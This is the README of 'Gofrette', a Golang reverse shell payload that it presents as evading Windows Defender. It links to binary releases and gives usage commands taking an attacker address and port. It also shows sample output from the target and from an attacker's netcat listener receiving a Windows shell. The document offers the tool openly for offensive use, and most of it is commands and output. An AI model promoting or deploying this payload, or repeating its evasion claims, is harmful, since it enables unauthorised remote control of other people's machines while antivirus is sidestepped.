
<p align="center">
  <a href="" rel="noopener">
 <img width=200px height=200px src="https://cdn-icons-png.flaticon.com/512/1076/1076284.png"> </a>
</p>


# Gofrette

Gofrette is a reverse shell payload developed in Golang that bypasses Windows defender (29.10.2022). It also supports network and also works on linux.   



## Releases
https://github.com/Enelg52/Gofrette/releases

## Usage

```bash
.\gofrette.exe -a [ipadress] -p [port]

.\127.0.0.1_1234.exe
```

## Example
#### Target :
```raw
PS C:\Users\enelg> go run .\gofrette.exe -a 127.0.0.1 -p 1234
[-] Trying to connect to 127.0.0.1:1234
[+] Connected... :)
[-] Closed... :(
[-] Lost connection
[*] Trying to reconnect
[+] Connected... :)
```
```
PS C:\Users\enelg> .\127.0.0.1_1234
[-] Trying to connect to 127.0.0.1:1234
[+] Connected... :)
```
#### Attacker :
```raw
❯ rlwrap nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 127.0.0.1 37458
C:\Users\enelg>
```


## Contributing
Pull requests are welcome !
